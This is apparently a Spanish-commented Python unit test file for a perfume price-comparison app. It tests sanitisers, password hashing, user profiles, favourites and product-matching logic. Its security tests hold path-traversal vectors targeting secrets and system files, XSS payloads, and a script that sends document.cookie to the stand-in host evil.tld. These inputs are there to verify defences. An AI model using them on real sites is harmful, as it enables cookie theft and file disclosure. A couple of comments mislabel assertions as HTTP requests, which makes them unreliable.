# Importación de librería estándar o dependencia externa (hashlib)
import hashlib
# Importación de librería estándar o dependencia externa (os)
import os
# Importación de librería estándar o dependencia externa (sys)
import sys
# Importación de librería estándar o dependencia externa (tempfile)
import tempfile
# Importación de librería estándar o dependencia externa (unittest)
import unittest
# Importación de componentes (MagicMock, patch) desde el módulo 'unittest.mock'
from unittest.mock import MagicMock, patch

# Asignamos 'PROJECT_ROOT' con os.path.abspath(os.path.join(os.path.dirna...
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
# Asignamos 'APP_ROOT' con os.path.join(PROJECT_ROOT, 'APP')
APP_ROOT = os.path.join(PROJECT_ROOT, "APP")
# Recorremos iterativamente cada 'p' en (APP_ROOT, PROJECT_ROOT)
for p in (APP_ROOT, PROJECT_ROOT):
    # Evaluamos la condición lógica (p not in sys.path) para controlar el flujo
    if p not in sys.path:
        # Ejecutamos instrucción: sys.path.insert(0, p)
        sys.path.insert(0, p)

# Importación de librería estándar o dependencia externa (backend.database)
import backend.database as db
# Importación de componentes (coincide_entidad_detallada, detectar_formato_oferta, eliminar_palabras_duplicadas, es_producto_perfume_valido, ...) desde el módulo 'backend.normalizador'
from backend.normalizador import (
    coincide_entidad_detallada,
    detectar_formato_oferta,
    eliminar_palabras_duplicadas,
    es_producto_perfume_valido,
    limpiar_nombre_perfume,
    normalizar_marca_canonica,
)
# Importación de componentes (_es_vendedor_marketplace_no_verificado) desde el módulo 'backend.scraper_periodico'
from backend.scraper_periodico import _es_vendedor_marketplace_no_verificado
# Importación de componentes (DEFAULT_AVATAR_SVG, DEFAULT_PERFUME_IMAGE, escape_html, formatear_nombre_especifico, ...) desde el módulo 'ui.security'
from ui.security import (
    DEFAULT_AVATAR_SVG,
    DEFAULT_PERFUME_IMAGE,
    escape_html,
    formatear_nombre_especifico,
    get_image_src,
    is_valid_https_image_url,
    resolver_url_oferta,
    sanitize_external_url,
)


# Definición de clase 'TestUISecurityHardening' que modela la estructura y lógica del componente
class TestUISecurityHardening(unittest.TestCase):
    """Pruebas de cierre definitivo de vulnerabilidades LFI, Path Traversal y XSS."""

    # Definición de función 'test_lfi_path_traversal_bloqueado_en_get_image_src' sin parámetros externos
    def test_lfi_path_traversal_bloqueado_en_get_image_src(self):
        # Asignamos 'vectores_lfi' con ['../.streamlit/secrets.toml', '../../.str...
        vectores_lfi = [
            "../.streamlit/secrets.toml",
            "../../.streamlit/secrets.toml",
            "APP/.streamlit/secrets.toml",
            "../data/perfumes.db",
            "backend/database.py",
            "C:/Windows/win.ini",
            r"..\..\Windows\System32\drivers\etc\hosts",
            "/etc/passwd",
        ]
        # Recorremos iterativamente cada 'vector' en vectores_lfi
        for vector in vectores_lfi:
            # Gestión automática de contexto y recursos para: self.subTest(vector=vector)
            with self.subTest(vector=vector):
                # Asignamos 'res' con get_image_src(vector, allow_local=True, de...
                res = get_image_src(vector, allow_local=True, default_src=DEFAULT_PERFUME_IMAGE)
                # Aserción de prueba unitaria: self.assertEqual(res, DEFAULT_PERFUME_IMAGE)
                self.assertEqual(res, DEFAULT_PERFUME_IMAGE)

    # Definición de función 'test_avatar_usuario_bloquea_rutas_locales_y_http_inseguro' sin parámetros externos
    def test_avatar_usuario_bloquea_rutas_locales_y_http_inseguro(self):
        # Aserción de prueba unitaria: self.assertEqual(get_image_src('assets/cualquier.png...
        self.assertEqual(
            get_image_src("assets/cualquier.png", allow_local=False, default_src=DEFAULT_AVATAR_SVG),
            DEFAULT_AVATAR_SVG,
        )
        # Aserción de prueba unitaria: self.assertEqual(get_image_src('http://sitio-insegur...
        self.assertEqual(
            get_image_src("http://sitio-inseguro.cl/avatar.png", allow_local=False, default_src=DEFAULT_AVATAR_SVG),
            DEFAULT_AVATAR_SVG,
        )
        # Aserción de prueba unitaria: self.assertEqual(get_image_src('https://cdn.perfumet...
        self.assertEqual(
            get_image_src("https://cdn.perfumetrending.cl/avatars/u1.png", allow_local=False, default_src=DEFAULT_AVATAR_SVG),
            "https://cdn.perfumetrending.cl/avatars/u1.png",
        )
        # Aserción de prueba unitaria: self.assertFalse(is_valid_https_image_url('http://ej...
        self.assertFalse(is_valid_https_image_url("http://ejemplo.cl/a.jpg"))
        # Aserción de prueba unitaria: self.assertTrue(is_valid_https_image_url('https://ej...
        self.assertTrue(is_valid_https_image_url("https://ejemplo.cl/a.jpg"))

    # Definición de función 'test_data_uri_bloquea_ruptura_de_atributos_xss' sin parámetros externos
    def test_data_uri_bloquea_ruptura_de_atributos_xss(self):
        # Asignamos 'payload_malicioso' con 'data:image/png;base64,iVBORw0KGgo=" onerr...
        payload_malicioso = 'data:image/png;base64,iVBORw0KGgo=" onerror="alert(document.cookie)'
        # Aserción de prueba unitaria: self.assertEqual(get_image_src(payload_malicioso, al...
        self.assertEqual(
            get_image_src(payload_malicioso, allow_local=True, default_src=DEFAULT_PERFUME_IMAGE),
            DEFAULT_PERFUME_IMAGE,
        )
        # Asignamos 'svg_malicioso' con "data:image/svg+xml;utf8,<svg onload='aler...
        svg_malicioso = "data:image/svg+xml;utf8,<svg onload='alert(1)'></svg>"
        # Aserción de prueba unitaria: self.assertEqual(get_image_src(svg_malicioso, allow_...
        self.assertEqual(
            get_image_src(svg_malicioso, allow_local=True, default_src=DEFAULT_PERFUME_IMAGE),
            DEFAULT_PERFUME_IMAGE,
        )
        # Asignamos 'b64_limpio' con 'data:image/png;base64,iVBORw0KGgoAAAANSUh...
        b64_limpio = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
        # Aserción de prueba unitaria: self.assertEqual(get_image_src(b64_limpio, allow_loc...
        self.assertEqual(get_image_src(b64_limpio, allow_local=False), b64_limpio)

    # Definición de función 'test_escape_html_y_sanitize_external_url' sin parámetros externos
    def test_escape_html_y_sanitize_external_url(self):
        # Asignamos 'xss' con '<script>fetch("https://evil.tld?c="+docum...
        xss = '<script>fetch("https://evil.tld?c="+document.cookie)</script>'
        # Asignamos 'escapado' con escape_html(xss)
        escapado = escape_html(xss)
        # Aserción de prueba unitaria: self.assertNotIn('<script>', escapado)
        self.assertNotIn("<script>", escapado)
        # Aserción de prueba unitaria: self.assertIn('&lt;script&gt;', escapado)
        self.assertIn("&lt;script&gt;", escapado)

        # Recorremos iterativamente cada 'url_peligrosa' en ('javascript:alert(1)', 'JAVASCRIPT:alert(...
        for url_peligrosa in (
            "javascript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
            "file:///etc/passwd",
        ):
            # Aserción de prueba unitaria: self.assertEqual(sanitize_external_url(url_peligrosa...
            self.assertEqual(sanitize_external_url(url_peligrosa), "#")

        # Asignamos 'url_con_comillas' con 'https://tienda.cl/producto?x=1" onclick="...
        url_con_comillas = 'https://tienda.cl/producto?x=1" onclick="alert(1)'
        # Asignamos 'limpia' con sanitize_external_url(url_con_comillas)
        limpia = sanitize_external_url(url_con_comillas)
        # Aserción de prueba unitaria: self.assertNotIn('"', limpia)
        self.assertNotIn('"', limpia)
        # Aserción de prueba unitaria: self.assertTrue(limpia.startswith('https://tienda.cl...
        self.assertTrue(limpia.startswith("https://tienda.cl/"))

    # Definición de función 'test_resolver_url_oferta_dominios_unificados' sin parámetros externos
    def test_resolver_url_oferta_dominios_unificados(self):
        # Asignamos 'u_alisha' con resolver_url_oferta('Alisha Perfumes', 'Mo...
        u_alisha = resolver_url_oferta("Alisha Perfumes", "Mod Vanilla", url_prod="", marca="Ariana Grande")
        # Aserción de prueba unitaria: self.assertTrue(u_alisha.startswith('https://alishap...
        self.assertTrue(u_alisha.startswith("https://alishaperfumes.cl/search?q="))

        # Asignamos 'u_oferta' con resolver_url_oferta('Oferta Perfumes', 'Kh...
        u_oferta = resolver_url_oferta("Oferta Perfumes", "Khamrah", url_prod="", marca="Lattafa")
        # Aserción de prueba unitaria: self.assertTrue(u_oferta.startswith('https://ofertap...
        self.assertTrue(u_oferta.startswith("https://ofertaperfumes.cl/search?q="))


# Definición de clase 'TestPasswordCryptoAndDatabaseIntegrity' que modela la estructura y lógica del componente
class TestPasswordCryptoAndDatabaseIntegrity(unittest.TestCase):
    """Pruebas de criptografía PBKDF2, usuarios, favoritos, formatos Tester/Regular y paginación."""

    # Definición de función 'setUp' sin parámetros externos
    def setUp(self):
        # Asignamos 'self.tmpdir' con tempfile.TemporaryDirectory()
        self.tmpdir = tempfile.TemporaryDirectory()
        # Asignamos 'self.temp_db_path' con os.path.join(self.tmpdir.name, 'test_perfu...
        self.temp_db_path = os.path.join(self.tmpdir.name, "test_perfumes.db")
        # Asignamos 'self.patches' con [patch.object(db, 'DB_PATH', self.temp_db_...
        self.patches = [
            patch.object(db, "DB_PATH", self.temp_db_path),
            patch.object(db, "DB_DIR", self.tmpdir.name),
            patch.object(db, "is_supabase_disponible", return_value=False),
            patch.object(db, "get_supabase", return_value=None),
            patch.object(db, "_obtener_admin_auth", return_value=None),
        ]
        # Recorremos iterativamente cada 'p' en self.patches
        for p in self.patches:
            # Ejecutamos instrucción: p.start()
            p.start()
        # Ejecutamos instrucción: db._INITIALIZED_DB_PATHS.discard(os.path.abspath(sel...
        db._INITIALIZED_DB_PATHS.discard(os.path.abspath(self.temp_db_path))
        # Ejecutamos instrucción: db.limpiar_cache_catalogo()
        db.limpiar_cache_catalogo()
        # Ejecutamos instrucción: db.init_db()
        db.init_db()

    # Definición de función 'tearDown' sin parámetros externos
    def tearDown(self):
        # Recorremos iterativamente cada 'p' en reversed(self.patches)
        for p in reversed(self.patches):
            # Ejecutamos instrucción: p.stop()
            p.stop()
        # Ejecutamos instrucción: self.tmpdir.cleanup()
        self.tmpdir.cleanup()

    # Definición de función 'test_pbkdf2_hash_y_migracion_transparente_sha256' sin parámetros externos
    def test_pbkdf2_hash_y_migracion_transparente_sha256(self):
        # Asignamos 'h1' con db.hash_password('ClaveSegura2026!')
        h1 = db.hash_password("ClaveSegura2026!")
        # Asignamos 'h2' con db.hash_password('ClaveSegura2026!')
        h2 = db.hash_password("ClaveSegura2026!")
        # Aserción de prueba unitaria: self.assertTrue(h1.startswith('pbkdf2_sha256$600000$'))
        self.assertTrue(h1.startswith("pbkdf2_sha256$600000$"))
        # Aserción de prueba unitaria: self.assertNotEqual(h1, h2)
        self.assertNotEqual(h1, h2)  # Sales aleatorias distintas

        # Asignamos '(ok, rehash)' con db.verify_password_hash('ClaveSegura2026!'...
        ok, rehash = db.verify_password_hash("ClaveSegura2026!", h1)
        # Aserción de prueba unitaria: self.assertTrue(ok)
        self.assertTrue(ok)
        # Aserción de prueba unitaria: self.assertFalse(rehash)
        self.assertFalse(rehash)

        # Asignamos '(bad, _)' con db.verify_password_hash('Incorrecta123', h1)
        bad, _ = db.verify_password_hash("Incorrecta123", h1)
        # Aserción de prueba unitaria: self.assertFalse(bad)
        self.assertFalse(bad)

        # Asignamos 'legacy_sha' con hashlib.sha256('MiClaveAntigua99'.encode('...
        legacy_sha = hashlib.sha256("MiClaveAntigua99".encode("utf-8")).hexdigest()
        # Asignamos '(ok_leg, req_rehash)' con db.verify_password_hash('MiClaveAntigua99'...
        ok_leg, req_rehash = db.verify_password_hash("MiClaveAntigua99", legacy_sha)
        # Aserción de prueba unitaria: self.assertTrue(ok_leg)
        self.assertTrue(ok_leg)
        # Aserción de prueba unitaria: self.assertTrue(req_rehash)
        self.assertTrue(req_rehash)

    # Definición de función 'test_ciclo_completo_usuario_avatar_preferencias_y_favoritos' sin parámetros externos
    def test_ciclo_completo_usuario_avatar_preferencias_y_favoritos(self):
        # Rechazar contraseña débil (< 8 caracteres)
        ok_short, _ = db.crear_usuario("Ana", "ana@ejemplo.cl", "12345")
        # Aserción de prueba unitaria: self.assertFalse(ok_short)
        self.assertFalse(ok_short)

        # Registro válido
        ok_reg, _ = db.crear_usuario("Ana Pérez", "ana@ejemplo.cl", "Perfume Seguro 2026")
        # Aserción de prueba unitaria: self.assertTrue(ok_reg)
        self.assertTrue(ok_reg)

        # Rechazar duplicado
        ok_dup, _ = db.crear_usuario("Ana 2", "ANA@ejemplo.cl", "Perfume Seguro 2026")
        # Aserción de prueba unitaria: self.assertFalse(ok_dup)
        self.assertFalse(ok_dup)

        # Login exitoso y sin exposición de password_hash
        ok_login, user = db.verificar_usuario("ana@ejemplo.cl", "Perfume Seguro 2026")
        # Aserción de prueba unitaria: self.assertTrue(ok_login)
        self.assertTrue(ok_login)
        # Aserción de prueba unitaria: self.assertIsNotNone(user)
        self.assertIsNotNone(user)
        # Aserción de prueba unitaria: self.assertNotIn('password_hash', user)
        self.assertNotIn("password_hash", user)
        # Aserción de prueba unitaria: self.assertEqual(user['nombre'], 'Ana Pérez')
        self.assertEqual(user["nombre"], "Ana Pérez")

        # Validación mágica binaria de avatares: rechazar ejecutable/script disfrazado
        ok_bad_file, _ = db.subir_avatar_usuario(user["id"], b"MZ\x90\x00<script>alert(1)</script>", "image/png")
        # Aserción de prueba unitaria: self.assertFalse(ok_bad_file)
        self.assertFalse(ok_bad_file)

        # Asignamos 'png_1x1' con b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\...
        png_1x1 = (
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
            b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
            b"\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
        )
        # Asignamos '(ok_png, avatar_uri)' con db.subir_avatar_usuario(user['id'], png_1x...
        ok_png, avatar_uri = db.subir_avatar_usuario(user["id"], png_1x1, "image/png")
        # Aserción de prueba unitaria: self.assertTrue(ok_png)
        self.assertTrue(ok_png)
        # Aserción de prueba unitaria: self.assertTrue(avatar_uri.startswith('data:image/pn...
        self.assertTrue(avatar_uri.startswith("data:image/png;base64,"))

        # Bloquear ruta local en actualizar_perfil_usuario
        ok_lfi_prof, _ = db.actualizar_perfil_usuario(
            user["id"], "Ana Pérez", "ana@ejemplo.cl", "+56911112222", "Bio", "../secrets.toml", "Valdivia"
        )
        # Aserción de prueba unitaria: self.assertFalse(ok_lfi_prof)
        self.assertFalse(ok_lfi_prof)

        # Asignamos '(ok_prof, _)' con db.actualizar_perfil_usuario(user['id'], '...
        ok_prof, _ = db.actualizar_perfil_usuario(
            user["id"], "Ana M. Pérez", "ana@ejemplo.cl", "+56911112222", "Coleccionista", avatar_uri, "Valdivia"
        )
        # Aserción de prueba unitaria: self.assertTrue(ok_prof)
        self.assertTrue(ok_prof)

        # Asignamos '(ok_pref, _)' con db.actualizar_preferencias_notificacion(us...
        ok_pref, _ = db.actualizar_preferencias_notificacion(
            user["id"], alerta_email=True, umbral_descuento=20, notif_stock=False, notif_resumen=True
        )
        # Aserción de prueba unitaria: self.assertTrue(ok_pref)
        self.assertTrue(ok_pref)

        # Asignamos 'perfil' con db.obtener_perfil_usuario(user['id'])
        perfil = db.obtener_perfil_usuario(user["id"])
        # Aserción de prueba unitaria: self.assertEqual(perfil['nombre'], 'Ana M. Pérez')
        self.assertEqual(perfil["nombre"], "Ana M. Pérez")
        # Aserción de prueba unitaria: self.assertEqual(perfil['ubicacion'], 'Valdivia')
        self.assertEqual(perfil["ubicacion"], "Valdivia")
        # Aserción de prueba unitaria: self.assertEqual(perfil['umbral_descuento'], 20)
        self.assertEqual(perfil["umbral_descuento"], 20)
        # Aserción de prueba unitaria: self.assertFalse(perfil['notif_stock'])
        self.assertFalse(perfil["notif_stock"])
        # Aserción de prueba unitaria: self.assertTrue(perfil['notif_resumen'])
        self.assertTrue(perfil["notif_resumen"])

        # Favoritos y detección real de baja de precio
        self.assertTrue(db.agregar_favorito(user["id"], 1))
        # Aserción de prueba unitaria: self.assertTrue(db.es_favorito(user['id'], 1))
        self.assertTrue(db.es_favorito(user["id"], 1))
        # Asignamos 'favs' con db.obtener_favoritos_usuario(user['id'])
        favs = db.obtener_favoritos_usuario(user["id"])
        # Aserción de prueba unitaria: self.assertEqual(len(favs), 1)
        self.assertEqual(len(favs), 1)
        # Asignamos 'precio_inicial' con favs[0]['precio_guardado']
        precio_inicial = favs[0]["precio_guardado"]
        # Aserción de prueba unitaria: self.assertGreater(precio_inicial, 0)
        self.assertGreater(precio_inicial, 0)

        # Registrar una nueva oferta más barata y comprobar baja_detectada=True
        nuevo_precio = max(10000, precio_inicial - 25000)
        # Ejecutamos instrucción: db.registrar_observacion_oferta({'perfume_id': 1, 't...
        db.registrar_observacion_oferta({
            "perfume_id": 1,
            "tienda_id": 1,
            "precio_actual": nuevo_precio,
            "precio_normal": None,  # Verifica que None no rompa NOT NULL
            "en_stock": True,
            "url_producto": "https://www.falabella.com/falabella-cl/product/9999999/bleu-100ml",
            "volumen_ml": 100,
            "formato": "regular",
        })
        # Asignamos 'favs_post' con db.obtener_favoritos_usuario(user['id'])
        favs_post = db.obtener_favoritos_usuario(user["id"])
        # Aserción de prueba unitaria: self.assertTrue(favs_post[0]['baja_detectada'])
        self.assertTrue(favs_post[0]["baja_detectada"])
        # Aserción de prueba unitaria: self.assertEqual(favs_post[0]['mejor_precio_actual']...
        self.assertEqual(favs_post[0]["mejor_precio_actual"], nuevo_precio)

        # Aserción de prueba unitaria: self.assertTrue(db.eliminar_favorito(user['id'], 1))
        self.assertTrue(db.eliminar_favorito(user["id"], 1))
        # Aserción de prueba unitaria: self.assertFalse(db.es_favorito(user['id'], 1))
        self.assertFalse(db.es_favorito(user["id"], 1))

    # Definición de función 'test_separacion_formato_regular_vs_tester_y_retiro_tras_5_fallos' sin parámetros externos
    def test_separacion_formato_regular_vs_tester_y_retiro_tras_5_fallos(self):
        # Insertar un perfume nuevo sellado a $89.990 y un Tester a $54.990
        res_reg = db.guardar_o_actualizar_perfume_scraped(
            nombre="Sauvage Eau de Parfum",
            marca="Christian Dior",
            precio_actual=89990,
            precio_normal=109990,
            tienda_nombre="Paris",
            url_producto="https://www.paris.cl/dior-sauvage-edp-100ml.html",
            volumen_ml=100,
            tipo="Eau de Parfum",
            formato="regular",
        )
        # Aserción de prueba unitaria: self.assertTrue(res_reg['exito'])
        self.assertTrue(res_reg["exito"])
        # Asignamos 'pid' con res_reg['perfume_id']
        pid = res_reg["perfume_id"]

        # Asignamos 'res_tst' con db.guardar_o_actualizar_perfume_scraped(no...
        res_tst = db.guardar_o_actualizar_perfume_scraped(
            nombre="Tester Dior Sauvage EDP 100ml",
            marca="Dior",
            precio_actual=54990,
            precio_normal=89990,
            tienda_nombre="Silk Perfumes",
            url_producto="https://www.silkperfumes.cl/products/tester-dior-sauvage-edp-100ml",
            volumen_ml=100,
            tipo="Eau de Parfum",
            formato="tester",
        )
        # Aserción de prueba unitaria: self.assertTrue(res_tst['exito'])
        self.assertTrue(res_tst["exito"])
        # Normalización canónica de marca ('Christian Dior' == 'Dior') une el mismo perfume pero separa la variante tester
        self.assertEqual(res_tst["perfume_id"], pid)

        # Asignamos 'catalogo' con db.obtener_catalogo(busqueda='Sauvage')
        catalogo = db.obtener_catalogo(busqueda="Sauvage")
        # Asignamos 'item_cat' con next((p for p in catalogo if p['id'] == pid))
        item_cat = next(p for p in catalogo if p["id"] == pid)
        # El precio de portada del catálogo debe priorizar el producto Regular ($89.990) sobre el Tester ($54.990)
        self.assertEqual(item_cat["mejor_precio"], 89990)

        # Asignamos 'precios_ficha' con db.obtener_precios_actuales(pid)
        precios_ficha = db.obtener_precios_actuales(pid)
        # Asignamos 'formatos' con {p['tienda_nombre']: p['formato'] for p in...
        formatos = {p["tienda_nombre"]: p["formato"] for p in precios_ficha}
        # Petición HTTP GET hacia el servidor externo con control de timeout y cabeceras
        self.assertEqual(formatos.get("Paris"), "regular")
        # Petición HTTP GET hacia el servidor externo con control de timeout y cabeceras
        self.assertEqual(formatos.get("Silk Perfumes"), "tester")

        # Verificar que tras 5 fallos consecutivos la oferta pasa a 'requiere_revision' sin borrar su último precio
        with db.get_db_cursor() as cur:
            # Ejecutamos instrucción: cur.execute("SELECT oa.variante_id, oa.tienda_id FRO...
            cur.execute(
                "SELECT oa.variante_id, oa.tienda_id FROM ofertas_actuales oa "
                "JOIN variantes_perfume vp ON vp.id = oa.variante_id "
                "WHERE vp.perfume_id = ? AND vp.formato = 'regular';",
                (pid,),
            )
            # Asignamos 'row_oa' con cur.fetchone()
            row_oa = cur.fetchone()

        # Asignamos 'estado_final' con None
        estado_final = None
        # Recorremos iterativamente cada 'i' en range(5)
        for i in range(5):
            # Asignamos 'r_fail' con db.registrar_fallo_scraping(tienda_id=row_...
            r_fail = db.registrar_fallo_scraping(
                tienda_id=row_oa["tienda_id"],
                variante_id=row_oa["variante_id"],
                mensaje=f"Timeout simulado #{i + 1}",
            )
            # Asignamos 'estado_final' con r_fail['estado']
            estado_final = r_fail["estado"]
            # Aserción de prueba unitaria: self.assertEqual(r_fail['precio_actual'], 89990)
            self.assertEqual(r_fail["precio_actual"], 89990)
        # Aserción de prueba unitaria: self.assertEqual(estado_final, 'requiere_revision')
        self.assertEqual(estado_final, "requiere_revision")

        # Trazabilidad de scraping_runs normalizando 'completado' -> 'exitoso'
        run_id = db.iniciar_scraping_run("periodico", mensaje_detalle="Test unitario")
        # Aserción de prueba unitaria: self.assertIsNotNone(run_id)
        self.assertIsNotNone(run_id)
        # Ejecutamos instrucción: db.finalizar_scraping_run(run_id, estado='completado...
        db.finalizar_scraping_run(run_id, estado="completado", productos_procesados=10, cambios_precio=2)
        # Gestión automática de contexto y recursos para: db.get_db_cursor()
        with db.get_db_cursor() as cur:
            # Ejecutamos instrucción: cur.execute('SELECT estado, productos_procesados, ca...
            cur.execute("SELECT estado, productos_procesados, cambios_precio FROM scraping_runs WHERE id = ?;", (run_id,))
            # Asignamos 'row_run' con cur.fetchone()
            row_run = cur.fetchone()
            # Aserción de prueba unitaria: self.assertEqual(row_run['estado'], 'exitoso')
            self.assertEqual(row_run["estado"], "exitoso")
            # Aserción de prueba unitaria: self.assertEqual(row_run['productos_procesados'], 10)
            self.assertEqual(row_run["productos_procesados"], 10)
            # Aserción de prueba unitaria: self.assertEqual(row_run['cambios_precio'], 2)
            self.assertEqual(row_run["cambios_precio"], 2)

    # Definición de función 'test_paginacion_automatica_fetch_all_rows_supera_1000_filas' sin parámetros externos
    def test_paginacion_automatica_fetch_all_rows_supera_1000_filas(self):
        # Asignamos 'total_filas' con 2450
        total_filas = 2450
        # Asignamos 'dataset' con [{'id': i} for i in range(1, total_filas +...
        dataset = [{"id": i} for i in range(1, total_filas + 1)]

        # Definición de función 'fake_query' (parámetros: offset, limit)
        def fake_query(offset: int, limit: int):
            # Asignamos 'mock_exec' con MagicMock()
            mock_exec = MagicMock()
            # Asignamos 'mock_exec.execute.return_value' con MagicMock(data=dataset[offset:offset + lim...
            mock_exec.execute.return_value = MagicMock(data=dataset[offset : offset + limit])
            # Retornamos el resultado procesado (mock_exec)
            return mock_exec

        # Asignamos 'resultado' con db._fetch_all_rows(fake_query, page_size=1...
        resultado = db._fetch_all_rows(fake_query, page_size=1000)
        # Aserción de prueba unitaria: self.assertEqual(len(resultado), total_filas)
        self.assertEqual(len(resultado), total_filas)
        # Aserción de prueba unitaria: self.assertEqual(resultado[0]['id'], 1)
        self.assertEqual(resultado[0]["id"], 1)
        # Aserción de prueba unitaria: self.assertEqual(resultado[-1]['id'], total_filas)
        self.assertEqual(resultado[-1]["id"], total_filas)


# Definición de clase 'TestEntityResolutionProductionRegressions' que modela la estructura y lógica del componente
class TestEntityResolutionProductionRegressions(unittest.TestCase):
    """Regresiones reales encontradas durante la auditoría del catálogo de producción."""

    # Definición de función 'test_bloquea_cosmeticos_en_gramos_sachets_perfumeros_combos_y_decants' sin parámetros externos
    def test_bloquea_cosmeticos_en_gramos_sachets_perfumeros_combos_y_decants(self):
        # Asignamos 'casos_invalidos' con [('Labial Rouge Dior Forever 3,2G', 'Dior'...
        casos_invalidos = [
            ("Labial Rouge Dior Forever 3,2G", "Dior"),
            ("Crema Corporal Hidratante 75 gr", "Carolina Herrera"),
            ("Sachet Aromático Lavanda Closet", "Maison"),
            ("Perfumero Recargable Portátil De Vidrio 5ml", "Genérico"),
            ("Polo Red EDT 125ml + Polo 67 EDT 40ml", "Ralph Lauren"),
            ("Decant Creed Aventus 10ml", "Creed"),
        ]
        # Recorremos iterativamente cada '(titulo, marca)' en casos_invalidos
        for titulo, marca in casos_invalidos:
            # Gestión automática de contexto y recursos para: self.subTest(titulo=titulo)
            with self.subTest(titulo=titulo):
                # Aserción de prueba unitaria: self.assertFalse(es_producto_perfume_valido(titulo, ...
                self.assertFalse(es_producto_perfume_valido(titulo, marca=marca))

    # Definición de función 'test_preserva_for_him_for_her_y_flankers_en_limpiar_nombre' sin parámetros externos
    def test_preserva_for_him_for_her_y_flankers_en_limpiar_nombre(self):
        # Asignamos 'n_him' con limpiar_nombre_perfume('Calvin Klein CK On...
        n_him = limpiar_nombre_perfume("Calvin Klein CK One Shock For Him EDT 200ml", "Calvin Klein")
        # Asignamos 'n_her' con limpiar_nombre_perfume('Calvin Klein CK On...
        n_her = limpiar_nombre_perfume("Calvin Klein CK One Shock For Her EDT 200ml", "Calvin Klein")
        # Aserción de prueba unitaria: self.assertNotEqual(n_him.lower(), n_her.lower())
        self.assertNotEqual(n_him.lower(), n_her.lower())
        # Aserción de prueba unitaria: self.assertIn('for him', n_him.lower())
        self.assertIn("for him", n_him.lower())
        # Aserción de prueba unitaria: self.assertIn('for her', n_her.lower())
        self.assertIn("for her", n_her.lower())

        # Asignamos 'n_elixir' con limpiar_nombre_perfume('Dior Sauvage Elixi...
        n_elixir = limpiar_nombre_perfume("Dior Sauvage Elixir 60ml", "Dior")
        # Aserción de prueba unitaria: self.assertIn('elixir', n_elixir.lower())
        self.assertIn("elixir", n_elixir.lower())

        # Aserción de prueba unitaria: self.assertEqual(normalizar_marca_canonica('Maison A...
        self.assertEqual(normalizar_marca_canonica("Maison Al Hambra"), "Maison Alhambra")
        # Aserción de prueba unitaria: self.assertEqual(normalizar_marca_canonica('Christia...
        self.assertEqual(normalizar_marca_canonica("Christian Dior"), "Dior")
        # Aserción de prueba unitaria: self.assertEqual(detectar_formato_oferta('Perfume Ve...
        self.assertEqual(detectar_formato_oferta("Perfume Versace Eros 100ml (Tester)"), "tester")
        # Aserción de prueba unitaria: self.assertEqual(detectar_formato_oferta('Perfume Ve...
        self.assertEqual(detectar_formato_oferta("Perfume Versace Eros 100ml EDP"), "regular")

    # Definición de función 'test_filtro_vendedores_marketplace_terceros' sin parámetros externos
    def test_filtro_vendedores_marketplace_terceros(self):
        # Aserción de prueba unitaria: self.assertFalse(_es_vendedor_marketplace_no_verific...
        self.assertFalse(_es_vendedor_marketplace_no_verificado("Falabella", "Dior", "Sauvage"))
        # Aserción de prueba unitaria: self.assertFalse(_es_vendedor_marketplace_no_verific...
        self.assertFalse(_es_vendedor_marketplace_no_verificado("Ripley", "Chanel", "Bleu de Chanel"))
        # Aserción de prueba unitaria: self.assertFalse(_es_vendedor_marketplace_no_verific...
        self.assertFalse(_es_vendedor_marketplace_no_verificado("Silk Perfumes", "Versace", "Eros"))
        # Aserción de prueba unitaria: self.assertTrue(_es_vendedor_marketplace_no_verifica...
        self.assertTrue(_es_vendedor_marketplace_no_verificado("Importadora X SpA", "Dior", "Sauvage"))
        # Aserción de prueba unitaria: self.assertTrue(_es_vendedor_marketplace_no_verifica...
        self.assertTrue(_es_vendedor_marketplace_no_verificado("Perfumes Alternativos Chile", "Lattafa", "Khamrah"))

    # Definición de función 'test_coincide_entidad_rechaza_cruces_reales_de_produccion' sin parámetros externos
    def test_coincide_entidad_rechaza_cruces_reales_de_produccion(self):
        # Caso real oferta 7375: Terre d'Hermès infiltrado en Versace Pour Homme
        r1 = coincide_entidad_detallada(
            titulo="Terre d'Hermes Eau de Toilette 200 ml",
            perfume_nombre="Pour Homme",
            marca="Versace",
            concentracion="Eau de Toilette",
            volumen_esperado=200,
        )
        # Aserción de prueba unitaria: self.assertFalse(r1.coincide)
        self.assertFalse(r1.coincide)

        # Caso real oferta 1468: Lacoste Rose Sparkling infiltrado en Lacoste Pour Homme
        r2 = coincide_entidad_detallada(
            titulo="Lacoste Eau de Lacoste L.12.12 Rose Sparkling Tester EDT 100ml Mujer",
            perfume_nombre="Pour Homme",
            marca="Lacoste",
            concentracion="Eau de Toilette",
            volumen_esperado=100,
        )
        # Aserción de prueba unitaria: self.assertFalse(r2.coincide)
        self.assertFalse(r2.coincide)

    # Definición de función 'test_formatear_nombre_especifico' sin parámetros externos
    def test_formatear_nombre_especifico(self):
        # Caso Romance: nombre corto genérico 'Romance', marca Ralph Lauren, Mujer, Eau de Parfum
        p_romance = {"nombre": "Romance", "marca": "Ralph Lauren", "genero": "Mujer", "tipo": "Eau de Parfum"}
        # Aserción de prueba unitaria: self.assertEqual(formatear_nombre_especifico(p_roman...
        self.assertEqual(formatear_nombre_especifico(p_romance), "Romance Mujer EDP")

        # Caso Eros Mujer: nombre 'Eros', Versace, Mujer, Eau de Parfum
        p_eros_m = {"nombre": "Eros", "marca": "Versace", "genero": "Mujer", "tipo": "Eau de Parfum"}
        # Aserción de prueba unitaria: self.assertEqual(formatear_nombre_especifico(p_eros_...
        self.assertEqual(formatear_nombre_especifico(p_eros_m), "Eros Mujer EDP")

        # Caso Eros Hombre: nombre 'Eros', Versace, Hombre, Eau de Toilette
        p_eros_h = {"nombre": "Eros", "marca": "Versace", "genero": "Hombre", "tipo": "Eau de Toilette"}
        # Aserción de prueba unitaria: self.assertEqual(formatear_nombre_especifico(p_eros_...
